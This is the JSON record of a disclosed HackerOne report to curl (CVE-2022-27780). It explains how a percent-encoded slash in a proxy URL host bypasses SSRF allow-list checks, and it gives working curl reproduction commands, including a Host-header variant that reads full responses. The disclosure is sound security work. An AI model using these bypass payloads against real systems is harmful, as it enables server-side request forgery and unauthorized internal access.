{
  "id": 1553841,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNTUzODQx",
  "url": "https://hackerone.com/reports/1553841",
  "title": "CVE-2022-27780: percent-encoded path separator in URL host",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2022-04-28T17:26:19.588Z",
  "submitted_at": "2022-04-28T17:26:19.644Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "haxatron1",
    "url": "/haxatron1",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/f36x3eaxfnfo7885y97xarsr2csu/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 35663,
    "url": "https://hackerone.com/curl",
    "handle": "curl",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "curl",
      "twitter_handle": "",
      "website": "https://curl.se",
      "about": "cURL is an Open Source project providing a library and command-line tool for doing internet transfers"
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2022-27780"
  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2022-05-11T15:33:27.339Z",
  "bug_reporter_agreed_on_going_public_at": "2022-05-11T15:33:27.263Z",
  "team_member_agreed_on_going_public_at": "2022-05-11T06:47:33.158Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "## Summary:\nURL decoding the entire proxy string could lead to SSRF filter bypasses. For example,\n\nWhen the following curl specifies the proxy string `http://example.com%2F127.0.0.1`\n\n- If curl URL parser or another RFC3986 compliant parser parses the initial string http://127.0.0.1%2F.example.com, it will derive 127.0.0.1%2Fexample.com or 127.0.0.1/example.com as the host, if for instance, an SSRF check is used to determine if a host ends with .example.com (.example.com being a allow-listed domain), the check will succeed.\n- curl will then URL decode the entire proxy string to http://127.0.0.1/example.com and send it to the server\n````\nGET http://127.0.0.1/example.com HTTP/1.1\nHost: 127.0.0.1/example.com\nUser-Agent: curl/7.83.0\nAccept: */*\nProxy-Connection: Keep-Alive\n````\n- This proxy string is valid, and proxy servers, even RFC3986-compliant ones will send the request to the host 127.0.0.1\n\n## Steps To Reproduce:\nI switched things up and used 127.0.0.1 as the allow-listed server and example.com as the target server to make it easier (no need to setup a HTTP server) to reproduce.\n\n1. I used https://github.com/abhinavsingh/proxy.py as my proxy server. \n2. Perform the following:\n````\ncurl -x http://127.0.0.1:8899 http://example.com%2F127.0.0.1\n````\n3. You will receive a malformed response \n````\n<?xml version=\"1.0\" encoding=\"iso-8859-1\"?>\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\"\n         \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">\n<html xmlns=\"http://www.w3.org/1999/xhtml\" xml:lang=\"en\" lang=\"en\">\n        <head>\n                <title>400 - Bad Request</title>\n        </head>\n        <body>\n                <h1>400 - Bad Request</h1>\n        </body>\n</html>\n````\nHowever, this response is actually being returned by example.com, the reason is that proxy.py will forward the Host header, currently 127.0.0.1/example.com curl sends it, making it a Blind SSRF\n\n4. If \n- an attacker can control the host header either via curl itself \n- the proxy does not forward the host header curl sends, \n- or if servers which ignore the Host header entirely such as Express is used,\nit is possible to read the full response\n````\ncurl -x http://127.0.0.1:8899 -H \"Host: example.com\" http://example.com%2F127.0.0.1/%2e%2e/\n````\n## Recommended Fix:\nThe recommended fix for this is to not URL decode the host component of the proxy string when passing to proxy server.\n\n## Impact\n\nSSRF filter bypass at if the curl URL parser or a RFC 3986 parser is used, it could lead to blind / full SSRF depending on the proxy used.",
  "weakness": {
    "id": 68,
    "name": "Server-Side Request Forgery (SSRF)"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2022-06-10T06:47:33.266Z",
  "allow_singular_disclosure_after": -52990644.20559144,
  "singular_disclosure_allowed": true,
  "vote_count": 7,
  "voters": [
    "zy9ard3",
    "h4x0r_dz",
    "shivammusic",
    "diaaa",
    "lunc4",
    "awesome_chaitu",
    "ekgaribadmi"
  ],
  "severity": {
    "rating": "medium",
    "author_type": "Team"
  },
  "structured_scope": {
    "databaseId": 18844,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "https://github.com/curl/curl",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
